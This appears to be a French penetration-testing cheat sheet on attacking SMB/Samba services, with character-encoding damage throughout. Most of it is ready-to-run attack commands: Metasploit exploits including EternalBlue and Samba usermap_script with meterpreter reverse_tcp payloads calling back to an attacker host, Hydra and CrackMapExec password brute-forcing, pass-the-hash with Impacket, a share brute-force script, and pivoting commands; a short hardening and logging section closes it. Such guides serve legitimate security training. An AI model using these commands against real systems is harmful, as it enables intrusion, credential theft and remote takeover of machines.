# üîÑ SMB/Samba

[‚Üê Retour √† la table des mati√®res](../README.md)

## √ânum√©ration SMB/Samba

### Outils d'√©num√©ration
```bash
# √ânum√©ration compl√®te avec enum4linux
enum4linux -a target_ip

# Lister les partages SMB
smbclient -L //target_ip
smbclient -L //target_ip -N  # Sans authentication

# Mapping des partages avec smbmap
smbmap -H target_ip
smbmap -H target_ip -u username -p password
```

### Connexion aux partages
```bash
# Connexion √† un partage sp√©cifique
smbclient //target_ip/sharename
smbclient //target_ip/sharename -U username

# Commandes utiles dans smbclient
smb: \> ls
smb: \> cd directory
smb: \> get filename
smb: \> put local_file
smb: \> mget *.txt  # T√©l√©charger plusieurs fichiers
```

## Exploitation Samba

### Exploit is_known_pipename
```bash
# Exploit pour service de partage de fichiers Samba
use exploit/linux/samba/is_known_pipename
set RHOSTS target_ip
set RPORT 445
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit
```

### Autres exploits Samba courants
```bash
# Trans2Open Overflow (CVE-2003-0201)
use exploit/linux/samba/trans2open

# Samba 3.0.20 < 3.0.25rc3 (CVE-2007-2447)
use exploit/multi/samba/usermap_script
set RHOSTS target_ip
exploit
```

## Attaques par Force Brute

### Hydra sur SMB
```bash
# Force brute sur SMB
hydra -L users.txt -P passwords.txt smb://target_ip

# Avec un utilisateur sp√©cifique
hydra -l admin -P passwords.txt smb://target_ip
```

### CrackMapExec
```bash
# Test de credentials multiples
crackmapexec smb target_ip -u users.txt -p passwords.txt

# Test avec hash NTLM
crackmapexec smb target_ip -u username -H ntlm_hash

# Ex√©cution de commandes via SMB
crackmapexec smb target_ip -u username -p password -x "whoami"
```

## Pass-the-Hash

### Avec Impacket
```bash
# PSExec avec hash NTLM
python3 psexec.py -hashes :ntlm_hash username@target_ip

# WMIExec avec hash
python3 wmiexec.py -hashes :ntlm_hash username@target_ip

# SMBExec avec hash
python3 smbexec.py -hashes :ntlm_hash username@target_ip
```

### Avec Metasploit
```bash
# PSExec avec hash NTLM
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser username
set SMBPass ntlm_hash
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

## Null Sessions

### Test de sessions nulles
```bash
# Test avec smbclient
smbclient -L //target_ip -N

# Test avec rpcclient
rpcclient -U "" target_ip
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```

### √ânum√©ration via null session
```bash
# Avec enum4linux et null session
enum4linux -n target_ip

# Informations sur les utilisateurs
enum4linux -u target_ip

# Informations sur les groupes
enum4linux -g target_ip
```

## Protection et D√©tection

### Logs √† surveiller
```bash
# Logs Windows pour connexions SMB
# Event ID 4624 - Successful logon
# Event ID 4625 - Failed logon
# Event ID 5140 - Network share accessed

# Logs Linux Samba
tail -f /var/log/samba/log.smbd
```

### Durcissement SMB
```bash
# D√©sactiver SMBv1 (Windows)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Configuration Samba s√©curis√©e
# Dans /etc/samba/smb.conf :
# protocol = SMB2
# min protocol = SMB2
# max protocol = SMB3
```

## Ressources Utiles

- [SMB/CIFS Protocol Documentation](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview)
- [Samba Documentation](https://www.samba.org/samba/docs/)
- [Impacket Examples](https://github.com/SecureAuthCorp/impacket/tree/master/examples)

# üìÅ √ânum√©ration SMB/Samba

[‚Üê Retour √† la table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Nmap Scripts SMB](#nmap-scripts-smb)
- [Sessions Anonymes et Guest](#sessions-anonymes-et-acc√®s-guest)
- [Enum4linux](#enum4linux)
- [Bruteforce avec Hydra](#hydra-bruteforce)
- [Samba sur Linux](#samba-sur-linux)
- [CrackMapExec](#crackmapexec---√©num√©ration-des-shares)
- [Connexion aux Shares](#connexion-aux-shares)
- [M√©thodologie Compl√®te](#m√©thodologie-dattaque-smb-compl√®te)
- [PsExec](#smb-avec-psexec)
- [MS17-010 EternalBlue](#ms17-010-eternalblue)
- [Versions SMB et S√©curit√©](#versions-smb-et-s√©curit√©)

## Port par d√©faut : 445

## Nmap Scripts SMB

### Scripts d'√©num√©ration de base
```bash
# Identification des protocoles SMB support√©s
nmap -p445 --script smb-protocols targetIP

# Analyse du niveau de s√©curit√© SMB
nmap -p445 --script smb-security-mode targetIP

# √ânum√©ration des sessions actives
nmap -p445 --script smb-enum-sessions targetIP

# √ânum√©ration des partages disponibles
nmap -p445 --script smb-enum-shares targetIP

# D√©couverte de l'OS via SMB
nmap --script smb-os-discovery.nse -p 445 targetIP

# √ânum√©ration des utilisateurs (n√©cessite souvent des credentials)
nmap -p445 --script smb-enum-users.nse targetIP
```

### Scan complet avec d√©tection de version
```bash
# √ânum√©ration compl√®te des services SMB/NetBIOS
nmap -sV -p 139,445 targetIP
```

## Metasploit Modules
```bash
use scanner/smb/smb_enumusers
use scanner/smb/smb_login
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version
```

## Sessions anonymes et acc√®s guest

### Test d'acc√®s anonyme
```bash
# Liste des partages en mode anonyme
smbclient -L targetIP -N

# Connexion RPC anonyme
rpcclient -U "" -N targetIP

# Test d'acc√®s guest (appuyer sur Entr√©e pour le mot de passe)
smbclient -L targetIP
```

### V√©rification des sessions nulles
Les sessions nulles permettent l'acc√®s anonyme aux ressources SMB. Configuration dangereuse mais parfois pr√©sente sur les syst√®mes mal configur√©s.

```bash
# Test de connexion avec utilisateur vide
smbclient //targetIP/IPC$ -U ""
```

## Enum4linux
```bash
enum4linux -a targetIP
```

## Hydra Bruteforce ‚Üí [üìñ Guide Hydra](../06-tools/hydra.md)
```bash
# Bruteforce SMB
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

## Samba sur Linux

### √ânum√©ration avec smbmap
```bash
# √ânum√©ration des shares avec credentials
smbmap -H targetIP -u username -p password

# √ânum√©ration anonyme
smbmap -H targetIP -u anonymous
```

### Bruteforce Samba avec Hydra
```bash
# Bruteforce sp√©cifique pour Samba Linux
hydra -L users.txt -P passwords.txt targetIP smb
# ‚ö†Ô∏è R√©duire les threads si n√©cessaire : -t 3
```

## CrackMapExec - √ânum√©ration des shares ‚Üí [üìñ Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# V√©rifier les permissions des shares avec des credentials
crackmapexec smb targetIP -u administrator -p password --shares
```

## Connexion aux shares ‚Üí [üìñ Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion au share C$ (n√©cessite des privil√®ges admin)
smbclient //targetIP/C$ -U administrator

# Connexion √† un share sp√©cifique
smbclient //targetIP/sharename -U username
```

## M√©thodologie d'attaque SMB compl√®te

### √âtape 1 : Bruteforce initial ‚Üí [üìñ Guide Hydra](../06-tools/hydra.md)
```bash
# D√©couverte des credentials avec Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

**R√©sultats typiques :**
```
[445][smb] host: targetIP   login: rooty   password: spongebob
[445][smb] host: targetIP   login: demo   password: password1
[445][smb] host: targetIP   login: auditor   password: hellokitty
[445][smb] host: targetIP   login: administrator   password: pineapple
```

### √âtape 2 : √ânum√©ration des shares par utilisateur ‚Üí [üìñ Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Tester chaque credential trouv√© pour lister les shares
crackmapexec smb targetIP -u rooty -p spongebob --shares
crackmapexec smb targetIP -u demo -p password1 --shares
crackmapexec smb targetIP -u auditor -p hellokitty --shares
crackmapexec smb targetIP -u administrator -p pineapple --shares
```

### √âtape 3 : Connexion et exploration ‚Üí [üìñ Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion avec le compte ayant le plus de privil√®ges (g√©n√©ralement administrator)
smbclient //targetIP/C$ -U administrator

# Si C$ n'est pas accessible, tester d'autres shares d√©couverts
smbclient //targetIP/Users -U username
smbclient //targetIP/shared -U username
```

### √âtape 4 : Commandes dans smbclient
```bash
# Une fois connect√© au share SMB :
ls                    # Lister les fichiers
cd directory         # Changer de r√©pertoire
get filename         # T√©l√©charger un fichier
put localfile        # Upload un fichier
mget *.txt          # T√©l√©charger plusieurs fichiers
recurse ON          # Activer la r√©cursion
prompt OFF          # D√©sactiver les confirmations
mget *              # T√©l√©charger tout r√©cursivement
```

## Analyse des permissions

### Interpr√©tation des r√©sultats CrackMapExec
```bash
# Exemple de sortie crackmapexec --shares :
# ADMIN$    Disk      Remote Admin           READ,WRITE
# C$        Disk      Default share          READ,WRITE  
# IPC$      IPC       Remote IPC             READ
# Users     Disk      Users Directory        READ
```

**L√©gende des permissions :**
- `READ` : Lecture seule
- `WRITE` : √âcriture possible
- `READ,WRITE` : Acc√®s complet
- `NO ACCESS` : Aucun acc√®s

### Priorit√©s d'exploration
1. **C$** : Acc√®s au syst√®me de fichiers complet (admin requis)
2. **ADMIN$** : R√©pertoire Windows/System32 (admin requis)  
3. **Users** : R√©pertoires utilisateurs (souvent accessible)
4. **Shares personnalis√©s** : Peuvent contenir des donn√©es sensibles

## Script de bruteforce des shares
```bash
#!/bin/bash
TARGET="targetIP"
WORDLIST="/root/Desktop/wordlists/shares.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

## SMB avec PsExec (n√©cessite des credentials l√©gitimes)

### Test de login SMB
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
```

### PsExec avec Impacket
```bash
# Ex√©cution directe
psexec.py administrator@targetIP cmd.exe
```

### PsExec avec Metasploit
```bash
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password1  # Utiliser le mot de passe d√©couvert
exploit
# Obtention d'un meterpreter avec privil√®ges SYSTEM
```

**Fonctionnement de PsExec :**
- Utilise des credentials d'administrateur valides pour l'ex√©cution de code
- Similaire √† l'utilitaire SysInternals PsExec
- Cr√©e un service avec nom et description al√©atoires
- Nettoyage automatique apr√®s exploitation
- R√©sultat : Session Meterpreter avec privil√®ges NT AUTHORITY\SYSTEM

## MS17-010 EternalBlue

### D√©tection de la vuln√©rabilit√©
```bash
# Nmap script de d√©tection
nmap -sV -p 445 --script=smb-vuln-ms17-010 targetIP

# Scanner Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS targetIP
run
```

### Exploitation EternalBlue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS targetIP
run
```

## Acc√®s aux R√©seaux Internes via SMB

Une fois que tu as compromis une machine avec SMB, tu peux acc√©der aux r√©seaux internes.

**‚Üí [üìñ Guide Complet du Pivoting](../05-post-exploitation/pivoting-metasploit.md)**

### Commandes rapides pour l'acc√®s r√©seau
```bash
# Migration vers processus utilisateur (si n√©cessaire)
migrate -N explorer.exe

# Test d'acc√®s aux ressources internes
shell
net view IP_CIBLE_INTERNE

# Mappage de lecteurs r√©seau
net use D: \\IP_CIBLE_INTERNE\Documents
net use K: \\IP_CIBLE_INTERNE\C$
```

## Versions SMB et S√©curit√©

### Analyse des versions SMB
```bash
# Identification des protocoles support√©s
nmap -p445 --script smb-protocols targetIP
```

### Contexte s√©curitaire des versions SMB

#### SMBv1 (Extr√™mement dangereux)
- **D√©velopp√©** : Ann√©es 1980 (plus de 30 ans)
- **Vuln√©rabilit√©s** : Exploit√© par WannaCry et autres ransomwares
- **Manques de s√©curit√©** :
  - Pas d'int√©grit√© pr√©-authentification
  - N√©gociation de dialecte non s√©curis√©e
  - Pas de chiffrement
  - Connexions guest non s√©curis√©es
- **Recommandation** : D√©sactiver imp√©rativement

#### SMBv2/SMBv3 (Versions modernes)
- **Protections** : Chiffrement, int√©grit√© pr√©-authentification
- **S√©curit√©** : N√©gociation s√©curis√©e, d√©sactivation des connexions guest dangereuses
- **Versions** : SMB 2.0, 2.1, 3.0, 3.0.2, 3.1.1

### Configuration et d√©sactivation SMB
Les versions SMB peuvent √™tre activ√©es/d√©sactiv√©es via les registres Windows. SMBv1 reste pr√©sent m√™me sur les OS r√©cents mais peut √™tre d√©sactiv√©.